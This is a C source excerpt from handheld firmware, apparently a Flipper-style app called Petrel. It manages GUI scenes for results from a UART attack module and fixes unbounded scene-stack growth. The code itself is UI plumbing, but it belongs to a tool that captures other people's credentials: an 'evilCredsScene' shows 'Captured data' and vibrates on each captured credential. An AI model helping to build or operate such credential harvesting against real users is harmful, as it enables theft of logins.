// Reuse asynchronous result scenes instead of accumulating navigation history. scene_manager_next_scene
// has NO depth limit in this firmware, so a result/error arriving repeatedly (each posting
// PETREL_EVT_RECON / POPUP / CREDS) pushed a new scene every time and grew memory without bound.
// If the destination is already current, refresh it in place; else return to an existing instance of
// it; only push when there is none.
static void petrel_show_result(Petrel* app, uint32_t scene_id) {
    diag(5, scene_id, 0);
    if(scene_manager_get_current_scene(app->scene_manager) == scene_id) {
        Petrel_scene_on_enter_handlers[scene_id](app);
    } else if(!scene_manager_search_and_switch_to_previous_scene(app->scene_manager, scene_id)) {
        scene_manager_next_scene(app->scene_manager, scene_id);
    }
}

static bool Petrel_custom_callback(void* context, uint32_t custom_event) {
    FURI_LOG_D(TAG, __func__);
    furi_assert(context);
    Petrel* app = context;
    // Deferred GUI transitions posted from the UART worker thread (runs on the GUI thread).
    // A completion (result popup / recon view) arrives while the animated busy scene is the
    // current scene. Pop it first, else the result lands ON TOP of the spinner and BACK
    // falls back into the spinner ("busy <-> result" loop). The ERROR: path can arrive
    // with no busy scene, hence the busy_active guard.
    if(custom_event == PETREL_EVT_RECON) {
        if(script_running) return true;   // F1: keep result views off the script runner
        if(busy_active) scene_manager_previous_scene(app->scene_manager);
        petrel_show_result(app, pmfScene);
        return true;
    }
    if(custom_event == PETREL_EVT_POP) {
        // 2026-10-29: popping the hub from inside the submenu callback wedged the input loop.
        // Do it here, in the dispatcher's own event context.
        (void)scene_manager_previous_scene(app->scene_manager);
        return true;
    }
    if(custom_event == PETREL_EVT_POPUP) {
        if(script_running) return true;   // F1: ditto for the per-command popups
        if(busy_active) {
            diag(31, 3, 0); /* busy popup previous_scene begin */
            (void)scene_manager_previous_scene(app->scene_manager);
            diag(31, 3, 1);
        }
        diag(32, 2, 0);
        petrel_show_result(app, popupScene);
        diag(32, 2, 1);
        return true;
    }
    if(custom_event == PETREL_EVT_CREDS) {
        sess_creds++;
        if(set_vibro) {
            furi_hal_vibro_on(true);
            furi_delay_ms(120);
            furi_hal_vibro_on(false);
        }
        if(!creds_scene_shown) {
            petrel_show_result(app, evilCredsScene);
        } else {
            // Already on the captured-data screen: refresh the text in place. Pushing the
            // scene again on every credential re-entered it (on_exit ran each time).
            widget_reset(app->widget);
            widget_add_string_multiline_element(
                app->widget, 64, 4, AlignCenter, AlignTop, FontSecondary, "Captured data");
            widget_add_text_scroll_element(app->widget, 0, 16, 128, 50, credentials);
        }
        return true;
    }
    return scene_manager_handle_custom_event(app->scene_manager, custom_event);
}

